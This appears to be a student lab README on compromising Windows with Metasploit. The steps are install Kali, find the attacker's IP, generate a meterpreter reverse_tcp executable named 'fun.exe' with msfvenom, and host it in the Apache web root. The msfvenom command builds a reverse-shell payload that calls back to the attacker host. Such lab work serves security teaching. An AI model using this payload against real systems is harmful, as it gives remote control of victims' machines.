# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
![image](https://github.com/user-attachments/assets/13f8a0f8-4657-4262-8969-889a4294fdfa)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![image](https://github.com/user-attachments/assets/da56f33a-edde-4105-ae85-d386f38b7fdd)

copy the fun.exe into the apache ``/var/www/html``` folder
![image](https://github.com/user-attachments/assets/ce4f6a71-b409-4223-b111-9789adfd506f)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
